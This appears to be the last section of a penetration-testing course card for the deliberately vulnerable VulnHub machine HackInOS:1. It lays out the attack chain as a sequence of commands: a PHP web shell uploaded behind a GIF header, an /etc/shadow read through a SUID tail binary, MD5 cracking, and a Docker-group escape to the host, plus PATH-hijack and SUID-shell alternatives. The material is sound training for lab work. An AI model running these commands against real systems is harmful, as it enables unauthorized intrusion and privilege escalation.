- **English lab:** [`labs/3-040-hackinos-1/README.md`](../../labs/3-040-hackinos-1/README.md)
- **Greek mirror of this card:** [`Μηχανές/13-hackinos-1.md`](../../Μαθησιακή%20Διαδρομή%201%20-%20Εισαγωγή%20στην%20Κυβερνοασφάλεια/Μηχανές/13-hackinos-1.md)
- **Cross-checked writeups** (confirm :8000, md5(rand), SUID tail, docker group):
  - [Hacking Articles — HackInOS:1](https://www.hackingarticles.in/hackinos1-vulnhub-lab-walkthrough/)
  - [Jon Wood — HackInOS: 1](https://windsorwebdeveloper.com/hackinos-1-vulnhub-walkthrough/)
  - [iProg — HackInOS Walkthrough](https://www.iprog.it/blog/sicurezza-informatica/hackinos-1-walkthrough/)
  - [GTFOBins — docker](https://gtfobins.github.io/gtfobins/docker/)

- **Community notes — consensus, pitfalls and alternative routes** (cross-checked against the sources below):
  - **Consensus chain:** `nmap -p-` → `22` + `8000` (no 80; WordPress front page rendering broken) → `/etc/hosts hackinos` or Burp Match & Replace (base URL hard-coded to `localhost:8000`) → `robots.txt` → `/upload.php` (`/uploads` → 403, no indexing) → read `upload.php` from the dev's GitHub (`fatihhcelik/Vulnerable-Machine---Hint`) → upload `GIF87a`/`GIF89a`+PHP → `ffuf`/`wfuzz`/`dirb` the 100 candidates → www-data shell → `/.dockerenv` + `/proc/1/cgroup` = container → SUID `/usr/bin/tail` → `/etc/shadow` → `root:john` → `su root` (container, fake flag, `/root/.port` hint) → `wp-config.php` creds `wordpress:wordpress`, host `db` → MySQL → table `host_ssh_cred` → unsalted MD5 `e10adc3949ba59abbe56e057f20f883e` → `john --format=raw-md5` → `hummingbirdscyber:123456` → `ssh hummingbirdscyber@TARGET` → `999(docker)` → `docker run -v /:/host --rm -it alpine chroot /host sh` → host `/root/flag`.
  - **Common pitfall:** never add `TARGET localhost` — `127.0.0.1 localhost` already exists; give another hostname and drive the POST with curl/Burp, because from the browser the form posts to your own machine. (A commenter on Jon Wood's writeup who repointed `localhost` itself kept hitting `getimagesize(): Filename cannot be empty` — evidence of how much of the app assumes it.)
  - **Common pitfall:** the MIME check is live and magic-byte-only, so a real image header (`GIF87a`/`GIF89a`) is required; the filename is `md5(<name>.<rand>)` with the extension lower-cased **inside** the hash. Test a `.txt` upload too — the `:)` rejection proves the check exists.
  - **Common pitfall:** container root is not the goal — `su root` gives a fake flag (`Life consists of details..` in several writeups); you must pivot (`.port` → `wp-config.php` → MySQL) and then to SSH on port 22 as `hummingbirdscyber` for the `999(docker)` group.
  - **⚠️ Verification note:** the SUID-`tail` read of `/etc/shadow` yields only the **root** (`john`) hash; `hummingbirdscyber:123456` comes from the **web app's database** (a plain MD5 in `host_ssh_cred`), not from `/etc/shadow`.
  - **⚠️ Verification note:** writeups disagree on the shadow hash **format** — one screenshot shows `$6$` (SHA-512-crypt), other writeups mention the weaker `$1$` (MD5-crypt). John auto-detects either; do not force `--format` on that hash. The cracked value (`root:john`) is consensus. Likewise the DB container's IP varies by revision (`172.18.0.2` or `172.18.0.3`) — trust the Docker DNS name `db`.
  - **Alternative routes:** an SUID-root helper `a.out` in the user's home calls `whoami` by bare name with `/home/hummingbirdscyber/bin` first in `$PATH` → PATH hijack → SUID bash (`-p`!); for the escape `docker run --rm -v /home/$USER:/h_docs ubuntu sh -c 'cp /bin/sh /h_docs/ && chmod +s /h_docs/sh'` also works; and Hacking Articles pivots **from the www-data shell** with Metasploit (`web_delivery` → `autoroute` → `ping_sweep`/`portscan` over `172.18.0.0/16`) to find the MySQL container without ever taking the `su root` detour.
  - **Verified sources:** [Hacking Articles](https://www.hackingarticles.in/hackinos1-vulnhub-lab-walkthrough/) · [Jon Wood](https://windsorwebdeveloper.com/hackinos-1-vulnhub-walkthrough/) · [iProg](https://www.iprog.it/blog/sicurezza-informatica/hackinos-1-walkthrough/) · [Ethical Hackers Club](https://ethicalhackers.club/hackinos-level-1-vulnhub-complete-walkthrough-guide)

---

# Part H — If you get completely stuck

- Verify connectivity: `ping TARGET`, `ip -br a`.
- **First** the hostname `hackinos` (or a Burp Match & Replace rule) — and drive the POST with `curl`, not the browser.
- If `ffuf` does not find the file, check the string you hashed (extension included? lower-cased?).
- If you are root but the flag is fake: `cat /root/.port`, then `grep DB_ /var/www/html/wp-config.php` and log into MySQL.
- Check [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and [`docs/TOOLS.md`](../../docs/TOOLS.md).
- Revert the snapshot and redo from memory.

---

# 🎓 You have finished Learning Path 1

**Thirteen machines**, 30+ attack classes, and every technique in modules
[01](../01-Foundations-Networking-and-Recon.md)–[06](../06-Shells-Persistence-and-Escapes.md) used
at least once in anger.

**What to do now:**
1. Go back to [`docs/BEGINNER-PATH.md`](../../docs/BEGINNER-PATH.md) — you will recognise most tiers now.
2. Re-do **two machines from memory, without the writeup** — that is where knowledge becomes skill.
3. Step up to **Band 4**. The natural next two are [`labs/4-070-basic-pentesting-2`](../../labs/4-070-basic-pentesting-2/README.md)
   (the sequel to Machine 1) and [`labs/4-075-dc-9`](../../labs/4-075-dc-9/README.md).
4. For the five attack classes this path deliberately left out, do the **bridge labs** listed in the
   [path README](../README.md): CSRF/RFI, LDAP injection, IDOR, SSH port forwarding, and PHP deserialisation.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 12 — symfonos: 1](12-symfonos-1.md) · full writeup: [`labs/3-040-hackinos-1`](../../labs/3-040-hackinos-1/README.md)._
